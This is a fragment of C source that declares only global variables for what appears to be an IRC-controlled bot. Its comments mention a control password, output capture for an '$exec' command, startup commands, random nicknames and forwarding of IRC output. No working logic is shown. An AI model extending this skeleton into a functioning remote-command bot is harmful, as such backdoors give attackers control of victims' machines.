
char irc_psw[64]="";                            // password - single action

char irc_tmpfile[256];                          // result file name for $exec
char irc_inifile[256];                          // commands to exec at startup
char irc_logfile[256];                          // log file

int irc_count_goodconnect = 0;                  // # of connects
int irc_count_badconnect = 0;                   // # of connect() errors
int irc_count_exceptions = 0;                   // # of exceptions

char* irc_server_name;                          // IRC server parameters
DWORD irc_server_port;                          //
DWORD irc_server_ip;                            //

char  irc_local_host[1024];                     // 'localhost'
DWORD irc_local_ip;                             // local ip, as i hope
char irc_local_ip_str[32];                      //

SOCKET irc_socket;                              // working socket
int irc_error;                                  // error#

char irc_user_nick[32]="";                      // random
char irc_user_name[32];                         // ...
char irc_user_host[32];                         // ...
char irc_user_server[32];                       // ...
char irc_user_realname[32];                     // ==host2real(irc_local_ip)

char irc_forward[256];                          // forward IRC output to

#define IRCRECVSIZE     1024
char irc_recvstr[IRCRECVSIZE+1];                // irc_recvline()'s result

char irc_time_startup[256];                     // asciiz session start time

char irc_caller[1024];                          // used by PRIVMSG/irc_reply()
int irc_rpl;                                    // numeric reply

int online_mode;                                // 1==we're online
int logged_mode;                                // 1==we're logged in

#define MAXCANTLOGIN    32
int cantlogin_count = 0;                        // do sleep when MAX reached
